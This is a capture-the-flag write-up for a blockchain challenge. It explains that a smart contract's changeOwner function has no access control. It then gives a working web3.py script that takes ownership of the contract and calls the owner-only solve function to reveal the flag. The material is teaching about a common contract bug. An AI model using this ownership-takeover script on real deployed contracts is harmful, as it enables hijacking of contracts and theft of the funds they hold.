# ACCESS CONTROL PROBLEM GUIDE:

*(Blockchain — Medium, 200pt)*

## HINTS:
Hint 1: Maybe you can just become the owner?

## TOOLS:
`web3.py` ; the challenge's private key / RPC endpoint

## WALKTHROUGH:
1. `AccessControl.sol`: `solve()` reveals the flag but is `require(msg.sender == owner)`. However `changeOwner(address)` has **no access control** — anyone can call it.

2. Call `changeOwner(you)` to seize ownership, then `solve()`:
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider(RPC))
c = w3.eth.contract(address=CONTRACT, abi=ABI)
def send(fn):
    tx = fn.build_transaction({'chainId':w3.eth.chain_id,'gas':500000,
        'gasPrice':w3.eth.gas_price,'nonce':w3.eth.get_transaction_count(ME)})
    s = w3.eth.account.sign_transaction(tx, PRIV)
    return w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(s.raw_transaction))
send(c.functions.changeOwner(ME))
send(c.functions.solve())
```
    - Flag then shows on the challenge status page.
        - Answer: `picoCTF{...}` (instance-specific)

## NOTES:
- Missing-access-control is the #1 smart-contract bug: a state-changing function (`changeOwner`) with no `onlyOwner` modifier.
- Two transactions: take ownership, then trigger the owner-only reveal.
